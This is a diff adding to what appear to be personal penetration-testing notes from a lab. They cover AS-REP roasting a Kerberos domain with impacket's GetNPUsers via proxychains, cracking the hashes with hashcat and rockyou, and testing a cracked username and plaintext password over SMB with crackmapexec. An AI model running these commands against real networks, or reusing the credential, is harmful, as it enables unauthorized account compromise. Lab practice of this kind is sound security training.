@@ -1,8 +1,16 @@
 ==============================================================================
 [+] Kerberoast null Authentication 
 ==============================================================================
-Using GetNPUsers to perform an ASREP Roast (Kerberos PreAuth) with Null Authentication to extract user hash. Then Cracking it.
+
+# Using GetNPUsers to perform an ASREP Roast (Kerberos PreAuth) with Null Authentication to extract user hash. Then Cracking it.
 sudo proxychains python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py DANTE.ADMIN/ -no-pass -usersfile users.txt -dc-ip 172.16.2.5
+
+# Cracking hash.txt
 hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force -o cracked.txt
+
+#testing Password
+sudo proxychains python3  /usr/lib/python3/dist-packages/cme/crackmapexec.py smb 172.16.2.5 -u 'jbercov' -p 'myspace7'
+
+
 
 
